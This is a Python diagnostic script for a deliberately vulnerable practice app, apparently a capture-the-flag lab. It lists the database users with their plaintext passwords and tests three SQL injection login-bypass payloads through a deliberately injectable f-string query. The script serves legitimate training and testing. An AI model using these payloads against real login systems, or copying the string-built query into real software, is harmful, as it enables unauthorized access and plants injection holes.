#!/usr/bin/env python3
"""
Quick diagnostic to test if vulnerable.db exists and payloads work
Run this on Kali to debug
"""
import sqlite3
import os

print("=" * 60)
print("VULNERABLE APP DIAGNOSTICS")
print("=" * 60)

# Check if vulnerable.db exists
if os.path.exists('vulnerable.db'):
    print("\n✅ vulnerable.db EXISTS")
else:
    print("\n❌ vulnerable.db NOT FOUND - app needs to run once to create it")
    exit(1)

# Connect and test
try:
    conn = sqlite3.connect('vulnerable.db')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    # List all users
    print("\n📋 Users in database:")
    cursor.execute("SELECT id, username, password, is_admin FROM users;")
    users = cursor.fetchall()
    if not users:
        print("  ❌ NO USERS FOUND!")
    else:
        for user in users:
            print(f"  ID: {user['id']:2} | Username: {user['username']:10} | Admin: {'✓' if user['is_admin'] else '✗'} | Pass: {user['password']}")
    
    # Test payloads
    print("\n🧪 Testing SQL Injection Payloads:")
    
    test_payloads = [
        ("' OR '1'='1' -- ", "", "Simple OR"),
        ("admin'--", "anything", "Admin with comment"),
        ("' OR '1'='1", "' OR '1'='1", "Both params OR"),
    ]
    
    for username, password, label in test_payloads:
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        print(f"\n  [{label}]")
        print(f"  Query: {query}")
        try:
            cursor.execute(query)
            result = cursor.fetchone()
            if result:
                print(f"  ✅ SUCCESS: Got user '{result['username']}' (Admin: {result['is_admin']})")
                if result['is_admin']:
                    print(f"  🚩 WOULD SHOW: FLAG{{sql_injection_bypass_123}}")
            else:
                print(f"  ⚠️  No user returned")
        except Exception as e:
            print(f"  ❌ ERROR: {e}")
    
    conn.close()
    print("\n" + "=" * 60)
    print("END DIAGNOSTICS")
    print("=" * 60)

except Exception as e:
    print(f"\n❌ FATAL ERROR: {e}")
    import traceback
    traceback.print_exc()
